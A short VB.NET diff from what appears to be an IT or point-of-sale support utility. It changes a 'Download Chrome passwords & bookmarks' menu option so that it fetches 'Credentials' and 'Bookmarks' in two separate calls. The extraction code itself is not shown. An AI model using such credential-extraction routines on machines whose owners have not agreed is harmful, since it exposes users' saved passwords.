@@ -79,7 +79,8 @@ Public Class MainMenu
             Case "POS Installation tools"
                 Installs.ShowDialog()
             Case "Download Chrome passwords & bookmarks"
-                DownloadChromeData()
+                DownloadChromeData("Credentials")
+                DownloadChromeData("Bookmarks")
 
         End Select
         Me.Show()
